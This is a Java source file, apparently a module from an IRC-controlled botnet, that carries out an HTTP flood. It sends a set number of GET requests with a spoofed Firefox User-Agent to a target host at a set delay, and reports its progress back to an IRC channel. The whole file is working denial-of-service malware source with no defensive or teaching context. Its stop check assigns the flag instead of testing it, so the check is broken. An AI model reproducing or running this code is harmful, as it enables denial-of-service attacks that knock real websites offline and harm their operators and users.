package org.automatix.net.modules;

import org.automatix.net.IRC.Methods;
import org.automatix.net.ConfigFiles.IRCConfig;

import java.net.HttpURLConnection;
import java.net.URL;
import java.io.IOException;

/**
 * Created by IntelliJ IDEA.
 * User: Administrator
 * Date: Oct 27, 2008
 * Time: 8:58:09 PM
 * To change this template use File | Settings | File Templates.
 */
public class HttpFlood extends Thread {
    String host;
    int times;
    int delay;
    public HttpFlood(String host,int times,int delay) {
        this.host = host;
        this.times = times;
        this.delay = delay;
    }
	public void run() {
		if (IRCConfig.flooding) {
            try {
                IRCReader.ircWriter.sayChannel("Starting HTTP Flood");
            } catch (IOException e) {
                e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
            }
            for (int i = 0; i < times; i++) {
            try {
                if (IRCConfig.flooding = true) {
                HttpURLConnection.setFollowRedirects(false);
				HttpURLConnection conn = (HttpURLConnection)(new URL(host)).openConnection();
				conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3");
				conn.setRequestMethod("GET");
				conn.getResponseCode();
                    System.out.println(i);
                } else {
                    IRCReader.ircWriter.sayChannel("Stopped flooding after "+i+" connections");
                    i = times;
                }
            } catch(Exception e) {
                try {
                    IRCReader.ircWriter.sayChannel("HTTP Flood failed");
                } catch (IOException e1) {
                    e1.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
                }

            } finally {
				try {
					this.sleep(this.delay);
				} catch(InterruptedException ie) {}

            }
            }
            IRCConfig.flooding = false;
            try {
                IRCReader.ircWriter.sayChannel("HTTP Flood finished");
            } catch (IOException e) {
                e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
            }
        }
	}
}


